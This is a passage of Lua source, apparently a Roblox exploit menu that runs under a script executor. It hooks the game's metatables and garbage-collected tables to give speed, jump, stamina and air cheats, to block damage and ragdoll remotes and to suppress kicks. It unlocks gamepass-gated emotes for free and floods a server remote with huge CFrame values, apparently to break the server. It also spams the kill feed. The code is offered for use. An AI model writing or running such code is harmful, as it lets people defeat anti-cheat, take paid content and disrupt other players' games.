        game.Players.LocalPlayer.Character.Humanoid.Died:Connect(function()
                    LocalPlayer.Character.Humanoid.AutoRotate = true
            		somerandomshit = true
					loop:Disconnect()
		end)
		fakingragdol = false
	end)--]]
    player:Element("Toggle", "Walk On Air (Q,E)")
    player:Element("Toggle", "Jesus")
    player:Element("Toggle", "No Fall Damage")
    player:Element("Toggle", "No Ragdoll")
    player:Element("Toggle", "No Dash Cooldown")
    player:Element("Toggle", "Infinite Stamina")
    player:Element("Toggle", "Infinite Air")
    player:Element("Toggle", "Infinite Jump")
    player:Element("Toggle", "No Jump Cooldown")
    player:Element("Toggle", "Jump Whenever")
    miscsector:Element("Toggle", "Kill Feed Spam")
    miscsector:Element("Toggle", "Free Emotes") 
	miscsector:Element("Toggle", "Hide Name")
	miscsector:Element('Button', 'Horizontal body (permanent)',{}, function()
		task.spawn(function()
			local events = game:GetService("ReplicatedStorage").Communication.Events
			local functions = game:GetService("ReplicatedStorage").Communication.Functions
			for i,v in pairs(getgc(true)) do
				if typeof(v) == "table" and rawget(v,"Remote") then
					v.Remote.Name = v.Name
				end
			end
			local oldnamecall; oldnamecall = hookmetamethod(game, "__namecall", function(self, ...)
				local args = {...}
				local method = getnamecallmethod();
			  
				if (method == "Kick" or method == "kick") and self == game.Players.LocalPlayer then
					return;
				end
			  
				return oldnamecall(self, unpack(args))
			end)
			while wait() do
			for i = 1,15 do
			local g = CFrame.new(Vector3.new(math.huge*9e9,math.huge*9e9,math.huge*9e9),Vector3.new(math.huge*9e9,math.huge*9e9,math.huge*9e9),Vector3.new(math.huge*9e9,math.huge*9e9,math.huge*9e9))
			local args = {
				[1] = {
					-- the g * g is not needed its just for testing
					[1] = g * g * g * g * g * g * g * g * g * g * g * g,
					[2] = g * g * g * g * g * g * g * g * g * g * g * g,
					[3] = g * g * g * g * g * g * g * g * g * g * g * g,
					[4] = g * g * g * g * g * g * g * g * g * g * g * g
				}
			}

			game:GetService("ReplicatedStorage").Communication.Events.ReplicateBodyRotation:FireServer(unpack(args))
			end
			end
		end)
	end)
    player:Element("Toggle", "Walk Speed")
    player:Element("Slider", "Speed", {min = 0, max = 150, default = 75})
    player:Element("Toggle", "Jump Power")
    player:Element("Slider", "Power", {min = 0, max = 500, default = 150})
    Noclipping = game:GetService'RunService'.Stepped:Connect(NoclipLoop)
    local Airdrops = game:GetService("Workspace").Airdrops
    task.spawn(function()
        Airdrops.ChildAdded:Connect(function(o)
            if values.misc.misc.player["Auto Airdrop-Claimer"].Toggle then
                 local Airdrop = o
                 LocalPlayer.Character.HumanoidRootPart.CFrame = Airdrop:WaitForChild'Crate'.Base.CFrame
                 wait(.2)
                 fireproximityprompt(Airdrop:WaitForChild'Crate'.Hitbox.ProximityPrompt)
            end
        end)
    end)
    --[[task.spawn(function()
        while task.wait() do
            pcall(function()
                if LocalPlayer.Character.Humanoid:FindFirstChildOfClass'RemoteEvent' ~= nil then
                    if values.misc.misc.player["No Ragdoll"].Toggle then
                        LocalPlayer.Character.Humanoid.RagdollRemoteEvent:FireServer(false)
                    end
                end
            end)
        end
    end)--]]
    task.spawn(function()
        while task.wait() do
            pcall(function()
                for i, v in pairs(getconnections(LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("WalkSpeed"))) do
					v:Disable()
                end
			    for i, v in pairs(getconnections(LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("JumpPower"))) do
					v:Disable()
				end
                if values.misc.misc.player["Walk Speed"].Toggle then
                    LocalPlayer.Character.Humanoid.WalkSpeed = values.misc.misc.player["Speed"].Slider
                    if values.misc.misc.player["Speed"].Slider > 75 then
                        LocalPlayer.Character.HumanoidRootPart.Anchored = true
                        task.wait(0.0001)
                        LocalPlayer.Character.HumanoidRootPart.Anchored = false
                    end
                    if LocalPlayer.Character:FindFirstChild("Float") ~= nil then
                        LocalPlayer.Character:FindFirstChild("Float"):Destroy()
                    end
                else
                    task.wait()
                    if LocalPlayer.Character.Humanoid.WalkSpeed > 30 then
                        LocalPlayer.Character.Humanoid.WalkSpeed = 16
                    end
                    LocalPlayer.Character.HumanoidRootPart.Anchored = false
                end
                
                if values.misc.misc.player["Jump Power"].Toggle then
                    LocalPlayer.Character.Humanoid.JumpPower = values.misc.misc.player["Power"].Slider
                else
                    LocalPlayer.Character.Humanoid.JumpPower = 50
                end
            end)
        end
    end)
	local mt = getrawmetatable(game)
	setreadonly(mt, false)
	local old = mt.__newindex	
	mt.__newindex = newcclosure(function(o, k, v)
	    if values.misc.misc.player["Walk Speed"].Toggle and (k == 'WalkSpeed') then
            v = values.misc.misc.player["Speed"].Slider
        end
                
        if values.misc.misc.player["Jump Power"].Toggle and (k == 'JumpPower') then
            v = values.misc.misc.player["Power"].Slider
		end
		return old(o, k, v)
	end)		
    task.spawn(function()
        game:GetService'RunService'.RenderStepped:Connect(function()
            if values.misc.misc2.misc["Hide Name"].Toggle then
                events.UpdateIsCrouching:FireServer(true)
            end
        end)
    end)
    
    task.spawn(function()
        game:GetService("RunService").RenderStepped:Connect(function()
            if values.misc.misc.player["Jesus"].Toggle then
                if workspace.Map:FindFirstChildOfClass"Model" ~= nil then
                    workspace.Map:FindFirstChildOfClass"Model".MapConfiguration.WaterAreas.WaterArea.CanCollide = true
                end
            else
                if workspace.Map:FindFirstChildOfClass"Model" ~= nil then
                    workspace.Map:FindFirstChildOfClass"Model".MapConfiguration.WaterAreas.WaterArea.CanCollide = false
                end
            end
        end)
    end)
    
    local UIS = game:GetService('UserInputService')
    
    UIS.InputBegan:Connect(function(k,j)
        if j then return end
        if k.KeyCode ==  Enum.KeyCode.Space then
            if values.misc.misc.player["Infinite Jump"].Toggle then
                pcall(function()
                    LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end)
            end
        end
    end)
    
    local FloatValue = -3.1
    qUp =
        Mouse.KeyUp:Connect(
        function(KEY)
            if KEY == "q" then
                FloatValue = FloatValue + 0.5
            end
        end
    )
    eUp =
        Mouse.KeyUp:Connect(
        function(KEY)
            if KEY == "e" then
                FloatValue = FloatValue - 0.5
            end
        end
    )
    qDown =
        Mouse.KeyDown:Connect(
        function(KEY)
            if KEY == "q" then
                FloatValue = FloatValue - 0.5
            end
        end
    )
    eDown =
        Mouse.KeyDown:Connect(
        function(KEY)
            if KEY == "e" then
                FloatValue = FloatValue + 0.5
            end
        end
    )
    local runService =
        game:GetService "RunService".RenderStepped:Connect(
        function()
            if
                (values.misc.misc.player["Walk On Air (Q,E)"].Toggle and
                    not values.misc.misc.player["Walk Speed"].Toggle)
             then
                if LocalPlayer.Character:FindFirstChild("Float") == nil then
                    local Float = Instance.new("Part")
                    Float.Name = "Float"
                    Float.Parent = LocalPlayer.Character
                    Float.Transparency = 1
                    Float.Size = Vector3.new(2, 0.2, 1.5)
                    Float.Anchored = true
                else
                    LocalPlayer.Character:FindFirstChild("Float").CFrame =
                        LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, FloatValue, 0)
                end
            elseif
                not values.misc.misc.player["Walk On Air (Q,E)"].Toggle and
                    LocalPlayer.Character:FindFirstChild("Float") ~= nil
             then
                LocalPlayer.Character:FindFirstChild("Float"):Destroy()
                events.UpdateIsParkouring:FireServer(false)
                FloatValue = -3.1
            end
            -- epic kill feed spammer
            if values.misc.misc2.misc["Kill Feed Spam"].Toggle then
                events.StartFastRespawn:FireServer()
                functions.CompleteFastRespawn:FireServer()
            end
        end
    )
    local newindex


    local newindex

    newindex =
        hookmetamethod(
        game,
        "__namecall",
        function(self, ...)
            local howcalledomg = getnamecallmethod()
            local whataretheargs = {...}

            if
                not checkcaller() and self.Name == "GotHitRE" and
                    values.misc.misc.utility["No Utility Damage (expect bombs)"].Toggle and
                    howcalledomg == "FireServer"
             then
                return wait(9e9)
            end
            if
                not checkcaller() and self.Name == "RagdollRemoteEvent" and
                    values.misc.misc.player["No Ragdoll"].Toggle and
                    howcalledomg == "FireServer"
             then
                return wait(9e9)
            end
            if
                not checkcaller() and self.Name == "StartFallDamage" or
                    self.Name == "TakeFallDamage" and values.misc.misc.player["No Fall Damage"].Toggle and
                        howcalledomg == "FireServer"
             then
                return wait(9e9)
            end
            if
                not checkcaller() and self.Name == "UpdateIsCrouching" and values.misc.misc2.misc["Hide Name"].Toggle and
                    howcalledomg == "FireServer"
             then
                return
            elseif
                not checkcaller() and self.Name == "UpdateIsCrouching" and
                    not values.misc.misc2.misc["Hide Name"].Toggle
             then
                return newindex(self, ...)
            end

            if
                not checkcaller() and self.Name == "UpdateIsParkouring" and
                    values.misc.misc.player["Walk On Air (Q,E)"].Toggle and
                    howcalledomg == "FireServer"
             then
                return
            elseif
                not checkcaller() and self.Name == "UpdateIsParkouring" and
                    not values.misc.misc.player["Walk On Air (Q,E)"].Toggle and
                    howcalledomg == "FireServer"
             then
                return newindex(self, ...)
            end

            return newindex(self, ...)
        end
    )

    for i, v in pairs(getgc(true)) do
        if type(v) == "table" and rawget(v, "AIR_TO_ADD_PER_SECOND_WHILE_SWIMMING") then
            local old = v.AIR_TO_ADD_PER_SECOND_WHILE_SWIMMING

            task.spawn(
                function()
                    while true do
                        if values.misc.misc.player["Infinite Air"].Toggle then
                            v.AIR_TO_ADD_PER_SECOND_WHILE_SWIMMING = 99999999999999999999999999999
                        else
                            v.AIR_TO_ADD_PER_SECOND_WHILE_SWIMMING = old
                        end
                        task.wait()
                    end
                end
            )
        end
        if typeof(v) == "table" and rawget(v, "getCanJump") then
            local old = v.getCanJump

            v.getCanJump = function()
                if values.misc.misc.player["Jump Whenever"].Toggle then
                    return true
                else
                    return old()
                end
            end
        end

        if typeof(v) == "table" and rawget(v, "JUMP_DELAY_ADD") then
            local old = v.JUMP_DELAY_ADD

            task.spawn(
                function()
                    while true do
                        if values.misc.misc.player["No Jump Cooldown"].Toggle then
                            v.JUMP_DELAY_ADD = 0.5
                        else
                            v.JUMP_DELAY_ADD = old
                        end
                        task.wait()
                    end
                end
            )
        end

        if typeof(v) == "table" and rawget(v, "_setStamina") then
            local old = v._setStamina

            v._setStamina = function(gg, gg2)
                if values.misc.misc.player["Infinite Stamina"].Toggle then
                    gg._stamina = math.huge
                    gg._staminaChangedSignal:Fire(150)
                else
                    return old(gg, gg2)
                end
            end
        end
        
        if typeof(v) == "table" and rawget(v, "toggleRagdoll") then
            local old = v.toggleRagdoll
            
            v.toggleRagdoll = function(gg, gg2, gg3)
                if values.misc.misc.player["No Ragdoll"].Toggle then
                    return
                else
                    return old(gg, gg2, gg3)
                end
            end
        end

        if typeof(v) == "table" and rawget(v, "DASH_COOLDOWN") then
            local old = v.DASH_COOLDOWN

            task.spawn(
                function()
                    while true do
                        if values.misc.misc.player["No Dash Cooldown"].Toggle then
                            v.DASH_COOLDOWN = -500
                        else
                            v.DASH_COOLDOWN = old
                        end
                        task.wait()
                    end
                end
            )
        end

        if typeof(v) == "table" and rawget(v, "gamepassIdRequired") then
            task.spawn(
                function()
                    while true do
                        if values.misc.misc2.misc["Free Emotes"].Toggle then
                            if v.gamepassIdRequired == "danceEmotes" then
                                v.gamepassIdRequired = nil
                            elseif v.gamepassIdRequired == "toxicEmotes" then
                                v.gamepassIdRequired = nil
                            elseif v.gamepassIdRequired == "respectEmotes" then
                                v.gamepassIdRequired = nil
                            end
                        else
                            if v.gamepassIdRequired == nil then
                                v.gamepassIdRequired = "danceEmotes"
                            end
                        end
                        task.wait()
                    end
                end
            )
        end
    end
end





do
	local radio = other:Sector('Radio','Left')
	radio:Element('TextBox', 'music',{placeholder = 'ID or path',NoLimit = true})
	radio:Element('Dropdown','type',{options = {'Roblox ID','workspace mp3'}})
	local function ValidateSong(songID) 
		if not songID or not tonumber(songID) then return false end

		local success, result = pcall(function()
			return game.MarketplaceService:GetProductInfo(songID)
		end)

		if success and result and result.AssetTypeId == 3 then
			return true
		else
			return false
		end
	end
	radio:Element('Slider','Volume', {min = 0,max = 10}, function(tbl)
		if getgenv().RadioSound then
			RadioSound.Volume = tbl.Slider/10
		end
	end)
	radio:Element('Button2','Play (resets audio)',{}, function()
		
		if values.other.Radio.type.Dropdown == 'Roblox ID' then
			if ValidateSong(values.other.Radio.music.Text) == true then
				if getgenv().RadioSound ~= nil then
					RadioSound:Stop()
					getgenv().RadioSound:Destroy()
					getgenv().RadioSound = nil
				end
				getgenv().RadioSound = Instance.new('Sound',workspace)
				RadioSound.Volume = values.other.Radio.Volume.Slider/10
				RadioSound.SoundId = "rbxassetid://"..values.other.Radio.music.Text
				RadioSound:Play()
			else return error('Wrong id or path!') end
		else
			getAsset = getsynasset or getcustomasset
			if not isfile(values.other.Radio.music.Text) then
				return error('Wrong id or path!')
			end
			if getgenv().RadioSound then
				getgenv().RadioSound:Destroy()
				getgenv().RadioSound = nil
			end
			getgenv().RadioSound = Instance.new('Sound',workspace)
			RadioSound.Volume = values.other.Radio.Volume.Slider/10
			RadioSound.SoundId = getAsset(values.other.Radio.music.Text)
			RadioSound:Play()			
		end
	end)
	radio:Element('Button2','Pause',nil,function()
		if RadioSound then
			RadioSound:Pause()
		end
	end)
	radio:Element('Button2','Resume',nil,function()
		if RadioSound then
			RadioSound:Resume()
		end
	end)	
	radio:Element('Button2','Stop (reset audio)',nil,function()
		if RadioSound then
			RadioSound:Stop()
		end
	end)	
	radio:Element('Toggle','Loop',nil,function(tbl)
		if RadioSound then
			RadioSound.Looped = tbl.Toggle
		end
	end)


	
	do
		local dvd = other:Sector('DVD Logo','Left')
		
		local ScreenGui = Instance.new("ScreenGui")
		local ImageLabel = Instance.new("ImageLabel")

		--Properties:

		ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
		ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		ScreenGui.Name = 'dvd logo'
		ScreenGui.Enabled = false

		ImageLabel.Parent = ScreenGui
		ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ImageLabel.BackgroundTransparency = 1.000
		ImageLabel.Position = UDim2.new(0.187000006, 0, 0.270999998, 0)
		ImageLabel.Size = UDim2.new(0, 187, 0, 83)
		ImageLabel.Image = "rbxassetid://10789990891"
		ImageLabel.SliceScale = 3.000

		-- Scripts:

		local function JVMZPQB_fake_script() -- ImageLabel.LocalScript 
			local script = Instance.new('LocalScript', ImageLabel)

			--script.Parent.Position = UDim2.new(0,math.random(10,script.Parent.Parent.AbsoluteSize.X),0,math.random(10,script.Parent.Parent.AbsoluteSize.Y))
			
			--print('check')
			
			getgenv().YSpeed = 5
			getgenv().XSpeed = 5
			
			getgenv().changecolor = false
			
			game:GetService('RunService').RenderStepped:Connect(function()
				local ScreenSize = script.Parent.Parent.AbsoluteSize
				
				script.Parent.Position += UDim2.new(0,getgenv().XSpeed,0,getgenv().YSpeed)
				--print(script.Parent.AbsolutePosition)
				if (script.Parent.AbsolutePosition.X >= ScreenSize.X or script.Parent.AbsolutePosition.X <= 0) or ((script.Parent.AbsolutePosition.X + script.Parent.AbsoluteSize.X) >= ScreenSize.X or (script.Parent.AbsolutePosition.X + script.Parent.AbsoluteSize.X) <= 0) then
					getgenv().XSpeed = getgenv().XSpeed * -1
					--print('X')
					if getgenv().changecolor then
						script.Parent.ImageColor3 = Color3.fromHSV(tick() % 1/1,1,1)
					end
				end
				if (script.Parent.AbsolutePosition.Y >= ScreenSize.Y or script.Parent.AbsolutePosition.Y <= 0) or ((script.Parent.AbsolutePosition.Y + script.Parent.AbsoluteSize.Y) >= ScreenSize.Y or (script.Parent.AbsolutePosition.Y + script.Parent.AbsoluteSize.Y) <= 0) then
					getgenv().YSpeed = getgenv().YSpeed * -1
					if getgenv().changecolor then
						script.Parent.ImageColor3 = Color3.fromHSV(tick() % 1/1,1,1)
					end
				end
			end)
		end
		coroutine.wrap(JVMZPQB_fake_script)()
		
		dvd:Element('ToggleColor','Enable',{},function(tbl)
			ScreenGui.Enabled = tbl.Toggle
			ScreenGui.ImageLabel.ImageColor3 = tbl.Color
		end)
		dvd:Element('Toggle','Change color when screen edge touched',{},function(tbl)
			getgenv().changecolor = tbl.Toggle
			--ScreenGui.ImageLabel.ImageColor3 = tbl.Color
		end)		
		dvd:Element("Slider",'Speed',{min = 1,max = 20,default = 10},function(tbl)
			if getgenv().YSpeed <= 0 then
				getgenv().YSpeed = tbl.Slider * -1
			else
				getgenv().YSpeed = tbl.Slider
			end
			if getgenv().XSpeed <= 0 then
				getgenv().XSpeed = tbl.Slider * -1
			else
				getgenv().XSpeed = tbl.Slider
			end			
		end)
	end
end



while true do task.wait()
	for i,b in next, watermarklocation.watermark:GetChildren() do 
		if b:IsA('UIGradient') then 
			if b.Name == values.misc.watermark.themes.Dropdown then 
				b.Enabled = true
			else
				b.Enabled = false
			end
		end
	end;

	if ovascreengui['menu'].Image ~= 'rbxassetid://'..themebackground[values.misc.addons['background'].Dropdown] then 
		ovascreengui['menu'].Image = 'rbxassetid://'..themebackground[values.misc.addons['background'].Dropdown]
	end;

	ovascreengui['menu'].ImageColor3 = values.misc.addons['background color'].Color
	ovascreengui['menu'].BackgroundColor3 = C.COL3RGB(1, 1, 1)

	ovascreengui['menu'].ImageTransparency = values.misc.addons['background color'].Transparency


	if values.misc.addons['ui border'].Toggle then 
		ovascreengui['menu'].BorderSizePixel = 1
		ovascreengui['menu'].BorderColor3 = values.misc.addons['ui border'].Color
	else 
		ovascreengui['menu'].BorderSizePixel = 0
	end;
end;